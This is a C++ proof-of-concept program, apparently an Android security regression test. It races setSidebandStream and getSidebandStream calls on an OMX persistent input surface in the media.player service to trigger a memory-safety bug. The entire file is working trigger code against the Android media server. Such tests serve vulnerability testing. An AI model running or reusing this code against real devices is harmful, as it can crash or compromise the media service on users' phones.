/*
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <binder/ProcessState.h>
#include <binder/TextOutput.h>
#include <cutils/ashmem.h>
#include <cutils/native_handle.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <jni.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <utils/NativeHandle.h>
using namespace android;
struct MyObserver : public BnOMXObserver {
  virtual void onMessages(const std::list<omx_message> &messages) {}
};

static void *start(void *args) {
  sp<IGraphicBufferConsumer> bufferConsumer =
      *(sp<IGraphicBufferConsumer> *)args;
  while (1) {
    sp<NativeHandle> stream = bufferConsumer->getSidebandStream();
  }
  return NULL;
}
int main(__attribute__((unused)) int argc,
         __attribute__((unused)) char *const argv[]) {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);
  sp<IOMX> omx = service->getOMX();
  sp<IGraphicBufferProducer> bufferProducer = NULL;
  sp<IGraphicBufferConsumer> bufferConsumer = NULL;
  status_t status =
      omx->createPersistentInputSurface(&bufferProducer, &bufferConsumer);
  if (status != OK) {
    return -1;
  }

  pthread_t thread;
  pthread_create(&thread, NULL, start, &bufferConsumer);

  native_handle_t *nativeHandle = native_handle_create(0, 20);
  sp<NativeHandle> nh = NativeHandle::create(nativeHandle, true);
  while (1) {
    bufferProducer->setSidebandStream(nh);
  }
  pthread_join(thread, NULL);
  return 0;
}
